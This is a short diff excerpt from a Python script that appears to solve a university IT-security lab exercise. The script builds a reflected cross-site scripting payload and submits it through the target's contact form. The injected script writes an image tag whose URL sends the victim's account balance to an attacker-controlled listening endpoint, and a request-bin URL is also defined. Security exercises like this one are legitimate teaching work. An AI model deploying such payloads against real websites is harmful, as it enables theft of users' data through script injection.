@@ -68,6 +68,7 @@ print(listening_url)
 reqbin = "https://enc7vb55oi6dk.x.pipedream.net/"
 listening_url += '/'
 contacttext = """http://t8.itsec.sec.in.tum.de/?ln=<script>document.write('<img src=" """ + listening_url + """?c='%2bdocument.getElementById('balance').firstElementChild.innerHTML%2b'">');</script>"""
+
 print(contacttext)
 response = session.post(TARGET_URL + "/contact", data={"contacttext": contacttext})
 
